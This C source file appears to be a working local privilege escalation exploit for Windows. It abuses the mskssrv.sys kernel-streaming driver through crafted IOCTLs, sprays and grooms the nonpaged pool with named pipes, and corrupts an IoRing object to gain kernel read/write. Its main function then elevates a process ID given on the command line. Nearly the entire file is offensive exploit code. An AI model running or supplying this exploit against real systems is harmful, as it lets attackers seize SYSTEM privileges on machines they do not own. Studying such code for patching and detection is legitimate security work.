#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <ioringapi.h>

#include "windefs.h"
#include "ioring.h"

#define KERNEL_BASE                    0xffff000000000000

// Kernel/Userspace memory address separation
#define USER_DS                        0x8000000000
#define KERNEL_DS                      0xFFFFFFFFFFFFFFFF
#define IS_KERNEL_POINTER(x)           (((x > KERNEL_BASE) && (x < KERNEL_DS))?1:0)


#define SPRAY_SIZE 0x1000

#define MSKSSRV_IOCTL_INIT_CONTEXT 0x2f0400
#define MSKSSRV_IOCTL_CONSUMETX    0x2f0410
#define MSKSSRV_IOCTL_PUBLISHRX    0x2f040c

int make_hole(PHANDLE pHandleArray, PHANDLE pFileArray)
{
    for (int i = 0; i < SPRAY_SIZE; i += 4)
    {
        CloseHandle(pHandleArray[i]);
        CloseHandle(pFileArray[i]);
    }
}

int spray_nonpagedpool(int size, void* payload, PHANDLE* ppHandleArray, PHANDLE* ppFileArray, BOOL ReAlloc)
{
    DWORD sz;
    int spray_size;

    if (ReAlloc)
    {
        PHANDLE pOldHandles = *ppHandleArray;
        PHANDLE pOldFiles = *ppFileArray;

        spray_size = SPRAY_SIZE * 2;

        for (int i = 0; i < SPRAY_SIZE; i++)
        {
            CloseHandle(pOldHandles[i]);
            CloseHandle(pOldFiles[i]);
        }

        free(pOldHandles);
        free(pOldFiles);
    }

    else
    {
        spray_size = SPRAY_SIZE;
    }

    PHANDLE pHandleArray = malloc(sizeof(HANDLE) * spray_size);
    PHANDLE pFileArray = malloc(sizeof(HANDLE) * spray_size);


    for (int i = 0; i < spray_size; i++) {

        pHandleArray[i] = CreateNamedPipe(
            L"\\\\.\\pipe\\innocent",
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            size,
            size,
            0,
            0);

        pFileArray[i] = CreateFile(L"\\\\.\\pipe\\innocent", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);

        int res = WriteFile(pFileArray[i], payload, size, &sz, NULL);

        if (!res)
        {
            printf("[-] Failed to writeFile payloadMid %d", GetLastError());
            return -1;
        }

    }

    *ppHandleArray = pHandleArray;
    *ppFileArray = pFileArray;

    return 0;

}

int spray_nonpagedpool_and_creg(int size, void* payload, PHANDLE* ppHandleArray, PHANDLE* ppFileArray, PHANDLE pCreg, BOOL ReAlloc)
{
    DWORD sz;
    int spray_size;

    if (ReAlloc)
    {
        PHANDLE pOldHandles = *ppHandleArray;
        PHANDLE pOldFiles = **ppFileArray;

        spray_size = SPRAY_SIZE * 2;

        for (int i = 0; i < SPRAY_SIZE; i++)
        {
            CloseHandle(pOldHandles[i]);
            CloseHandle(pOldFiles[i]);
        }

        free(pOldHandles);
        free(pOldFiles);
    }

    else
    {
        spray_size = SPRAY_SIZE;
    }

    PHANDLE pHandleArray = malloc(sizeof(HANDLE) * spray_size);
    PHANDLE pFileArray = malloc(sizeof(HANDLE) * spray_size);

    SIZE_T* pInputBuffer = (SIZE_T*)malloc(0x100);

    *pInputBuffer = 0x4fac41982f2c8ddd;    //0
    pInputBuffer[1] = 0x6deb705bb6129ba;   //0x8
    pInputBuffer[2] = 0x0000000200000000;  //0x10
    pInputBuffer[3] = 0x0000000000000000;  //0x18
    pInputBuffer[4] = 0x0000000000000000;  //0x20

    for (int i = 0; i < spray_size; i++) {

        if (ReAlloc)
        {
            CloseHandle(pHandleArray[i]);
            CloseHandle(pFileArray[i]);
        }

        pHandleArray[i] = CreateNamedPipe(
            L"\\\\.\\pipe\\innocent",
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            size,
            size,
            0,
            0);

        pCreg[i] = CreateFileA("\\\\?\\root#system#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96e080c7-143c-11d1-b40f-00a0c9223196}&{3c0d501a-140b-11d1-b40f-00a0c9223196}", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, 0, NULL);

        DeviceIoControl(pCreg[i], MSKSSRV_IOCTL_INIT_CONTEXT, pInputBuffer, 0x100, NULL, 0, NULL, NULL);

        pFileArray[i] = CreateFile(L"\\\\.\\pipe\\innocent", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);

        int res = WriteFile(pFileArray[i], payload, size, &sz, NULL);

        if (!res)
        {
            printf("[-] Failed to writeFile payloadMid %d", GetLastError());
            return -1;
        }

    }

    // make holes for creg and realloc

    for (int i = 0; i < spray_size; i += 4)
    {
        CloseHandle(pCreg[i]);
    }

    for (int i = 0; i < spray_size; i += 4)
    {
        pCreg[i] = CreateFileA("\\\\?\\root#system#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96e080c7-143c-11d1-b40f-00a0c9223196}&{3c0d501a-140b-11d1-b40f-00a0c9223196}", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, 0, NULL);
        DeviceIoControl(pCreg[i], MSKSSRV_IOCTL_INIT_CONTEXT, pInputBuffer, 0x100, NULL, 0, NULL, NULL);
    }

    *ppHandleArray = pHandleArray;
    *ppFileArray = pFileArray;

    return 0;
}

int GetNtFunctions(void)
{
    int ret = -1;

    _NtQuerySystemInformation = (unsigned long(__stdcall*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    if (_NtQuerySystemInformation == NULL)
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    return ret;
}

HANDLE scan_klfh(PHANDLE pCreg)
{
    HANDLE hTarget = INVALID_HANDLE_VALUE;
    SIZE_T* pInputBuffer = (SIZE_T*)malloc(0x100);
    char* pOutputBuffer = (SIZE_T*)malloc(0x100);
    DWORD bytesReturned;
    BOOL adjFound = FALSE;

    memset(pOutputBuffer, 0, 0x100);

    *pInputBuffer = 0x4fac41982f2c8ddd;    //0
    pInputBuffer[1] = 0x6deb705bb6129ba;   //0x8
    pInputBuffer[2] = 0x0000000200000000;  //0x10
    pInputBuffer[3] = 0x0000000000000000;  //0x18
    pInputBuffer[4] = 0x0000000100000001;  //0x20
    pInputBuffer[5] = 0x0000000000000000;  //0x28
    pInputBuffer[6] = 0x0000000000000000;  //0x30
    pInputBuffer[7] = 0x0000000000000000;  //0x38
    pInputBuffer[8] = 0x0000000000000000;  //0x40
    pInputBuffer[9] = 0x0000000000000000;  //0x48
    pInputBuffer[10] = 0x0000000000000000;  //0x50
    pInputBuffer[11] = 0x0000000000000000;  //0x58
    pInputBuffer[12] = 0x0000000000000000;  //0x60
    pInputBuffer[13] = 0x0000000000000000;  //0x68
    pInputBuffer[14] = 0x0000000000000001;  //0x70

    for (int i = 0; i < SPRAY_SIZE; i += 4)
    {
        DeviceIoControl(pCreg[i], MSKSSRV_IOCTL_CONSUMETX, pInputBuffer, 0x100, pOutputBuffer, 0x100, &bytesReturned, NULL);
        ULONG64 firstBuffSig = *(PULONG64)(pOutputBuffer + 0x8);
        DWORD secondBuffSig = *(DWORD*)(pOutputBuffer + 0x1C);

        if (firstBuffSig == 0x2)
        {
            adjFound = TRUE;
        }

        if (adjFound && (IS_KERNEL_POINTER(firstBuffSig)) && (secondBuffSig == 0x2090000))
        {
            hTarget = pCreg[i];
            break;
        }
    }

    return hTarget;
}

int do_pwn(PIORING_OBJECT pIoRing)
{
    int ret = -1;
    PHANDLE pHandles = NULL;
    PHANDLE pFiles = NULL;
    HANDLE creg[SPRAY_SIZE] = { 0 };

    HANDLE hTarget = INVALID_HANDLE_VALUE;


    HANDLE lol = CreateFileA("\\\\?\\root#system#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96e080c7-143c-11d1-b40f-00a0c9223196}&{3c0d501a-140b-11d1-b40f-00a0c9223196}", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, 0, NULL);

    SIZE_T* pInputBuffer = (SIZE_T*)malloc(0x100);

    *pInputBuffer = 0x4fac41982f2c8ddd;    //0
    pInputBuffer[1] = 0x6deb705bb6129ba;   //0x8
    pInputBuffer[2] = 0x0000000200000000;  //0x10
    pInputBuffer[3] = 0x0000000000000000;  //0x18
    pInputBuffer[4] = 0x0000000000000000;  //0x20

    char* payload = malloc(0x50);
    memset(payload, 0x0, 0x50);

    *(SIZE_T*)(payload + 0x38) = (char*)&pIoRing->CompletionUserEvent + 0x2;

    int res_spray = spray_nonpagedpool_and_creg(0x50, payload, &pHandles, &pFiles, creg, FALSE);

    if (res_spray != 0)
    {
        printf("spray fail\n");
        return 0;
    }

    hTarget = scan_klfh(creg);

    if (hTarget == INVALID_HANDLE_VALUE)
    {
        printf("heap grooming failed, try again?");
        return -1;
    }

    pInputBuffer[4] = 0x0000000100000001;  //0x20
    pInputBuffer[5] = 0x0000000000000000;  //0x28
    pInputBuffer[6] = 0x0000000000000000;  //0x30
    pInputBuffer[7] = 0x0000000000000000;  //0x38
    pInputBuffer[8] = 0x0000000000000000;  //0x40
    pInputBuffer[9] = 0x0000000000000000;  //0x48
    pInputBuffer[10] = 0x0000000000000000;  //0x50
    pInputBuffer[11] = 0x0000000000000000;  //0x58
    pInputBuffer[12] = 0x0000000000000000;  //0x60
    pInputBuffer[13] = 0x0000000000000000;  //0x68
    pInputBuffer[14] = 0x0000000000000001;  //0x70

    DeviceIoControl(hTarget, MSKSSRV_IOCTL_PUBLISHRX, pInputBuffer, 0x100, NULL, 0, NULL, NULL);

    *(SIZE_T*)(payload + 0x38) = &pIoRing->SignalCompletionEvent;

    res_spray = spray_nonpagedpool(0x50, payload, &pHandles, &pFiles, TRUE);

    if (res_spray != 0)
    {
        printf("spray fail\n");
        goto done;
    }

    hTarget = scan_klfh(creg);

    if (hTarget == INVALID_HANDLE_VALUE)
    {
        printf("second heap grooming failed, try again?");
        goto done;
    }

    DeviceIoControl(hTarget, MSKSSRV_IOCTL_PUBLISHRX, pInputBuffer, 0x100, NULL, 0, NULL, NULL);

    ret = 0;

done:
    return ret;
}

int main(int argc, char* argv[])
{
    int ret = -1;
    PIORING_OBJECT pIoRing = NULL;
    ULONG pid = 0;
    void* payload = malloc(0x100);
    memset(payload, 0x0, 0x100);

    PHANDLE pHandles = NULL;
    PHANDLE pFiles = NULL;

    HANDLE hProc = NULL;
    ULONG64 ullTargEPROCaddr = 0;

    printf("new heap groom!!\n");

    if (argc != 2)
    {
        printf("usage:\nexp.exe <pid>\n");
        goto done;
    }

    pid = strtol(argv[1], NULL, 10);

    printf("[!] Attempting to elevate pid %i\n", pid);

    ret = GetNtFunctions();

    if (0 != ret)
    {
        printf("[-] Failed to get address of NT functions: %0x\n", ret);
        goto done;
    }

    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);

    if (NULL == hProc)
    {
        ret = GetLastError();
        goto done;
    }

    ret = getobjptr(&ullTargEPROCaddr, GetCurrentProcessId(), hProc);

    if (0 != ret)
    {
        printf("[-] Failed to get address of EPROC : %0x\n", ret);
        goto done;
    }

    printf("target object ptr %llx\n", ullTargEPROCaddr);

    int res_spray = spray_nonpagedpool(0xf0, payload, &pHandles, &pFiles, FALSE);

    if (res_spray != 0)
    {
        printf("spray fail\n");
        return 0;
    }

    printf("making holes!\n");
    make_hole(pHandles, pFiles);

    ret = ioring_setup(&pIoRing);

    if (0 != ret)
    {
        printf("[-] IORING setup failed: %0x\n", ret);
        goto done;
    }

    printf("[+] IoRing Obj Address at %llx\n", pIoRing);

    res_spray = spray_nonpagedpool(0xf0, payload, &pHandles, &pFiles, FALSE);

    if (res_spray != 0)
    {
        printf("spray fail\n");
        return 0;
    }

    ret = do_pwn(pIoRing);

    ret = ioring_lpe(ullTargEPROCaddr, 0x20000, 0x2);

    if (0 != ret)
    {
        printf("[-] LPE Failed: %0x\n", ret);
    }

done:
    return ret;
}